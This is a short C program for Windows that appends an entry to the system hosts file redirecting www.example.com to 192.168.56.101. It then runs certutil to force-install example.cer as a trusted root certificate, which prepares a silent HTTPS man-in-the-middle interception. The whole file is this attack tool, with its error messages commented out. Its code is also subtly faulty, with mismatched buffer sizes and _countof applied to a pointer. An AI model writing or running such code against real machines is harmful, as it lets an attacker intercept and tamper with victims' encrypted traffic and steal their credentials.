#include <stdio.h>
#include "windows.h"
#include "tchar.h"
#include "cryptuiapi.h"

#define BUFSIZE 4096
#define VARNAME TEXT("SystemRoot")

#pragma comment(lib,"Cryptui.lib")

int main (void)
{
	LPTSTR completeVal,pszVal;
	LPTSTR strToAdd = TEXT("\\system32\\drivers\\etc\\hosts");
 	pszVal = (LPTSTR) malloc(_MAX_PATH*sizeof(TCHAR));
	DWORD dwRet, dwErr;
	BOOL fExist, fSuccess;

    	if(NULL == pszVal)
    	{
        	// printf("Out of memory\n");
        	return FALSE;
    	}

	dwRet = GetEnvironmentVariable(VARNAME, pszVal, BUFSIZE);
  /*      if(0 == dwRet)
    	{
        	dwErr = GetLastError();
        	if( ERROR_ENVVAR_NOT_FOUND == dwErr )
        	{
            		printf("Environment variable does not exist.\n");
            		fExist=FALSE;
        	}
    	}*/

	_tcsncat(pszVal, strToAdd, (_countof(pszVal)- strlen(pszVal) - 1));
	// _tprintf("%s",pszVal);

  FILE *pFile2;
	pFile2 = fopen(TEXT(pszVal), "a");
        if (pFile2 != NULL)
	{
		fputs("192.168.56.101 www.example.com\n",pFile2);
		fclose(pFile2);
	}

	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);

	char* myCommand = "certutil -addstore -f -enterprise -user root example.cer";
  system(myCommand);
	return 0;
}
